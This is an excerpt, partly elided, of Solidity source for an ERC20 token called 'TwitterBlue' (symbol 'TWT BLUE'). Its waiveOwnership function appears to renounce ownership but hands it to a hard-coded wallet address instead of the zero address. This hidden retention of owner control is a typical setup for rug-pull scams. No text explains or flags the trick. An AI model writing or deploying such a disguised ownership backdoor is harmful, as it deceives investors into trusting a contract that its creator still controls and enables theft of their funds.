...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xE6C53dAaB3BA407118Dc2113334F4eCFBB2E1Ea7));
        _owner = address(0xE6C53dAaB3BA407118Dc2113334F4eCFBB2E1Ea7);
    }
...
contract TwitterBlue is Context, IERC20, Ownable {
    ...
    string private _symbol = "TWT BLUE";
